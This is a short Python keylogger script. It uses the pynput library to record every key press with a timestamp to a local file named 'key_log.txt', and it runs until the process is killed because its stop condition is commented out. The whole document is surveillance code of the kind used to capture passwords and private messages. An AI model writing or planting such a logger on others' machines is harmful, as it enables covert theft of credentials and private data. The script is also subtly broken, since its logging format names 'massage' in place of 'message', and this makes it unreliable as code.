############## Libary ##############
from pynput.keyboard import Key, Listener

################ module from vanila #################
import logging

############## make a log file ##########
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(massage)s:')

def on_press(Key):
    logging.info(str(Key))
    # if key == Key.esc:
    #     stop listener
    #     return false

######## This says, listener is on ############
with Listener(on_press=on_press) as listener:
    listener.join()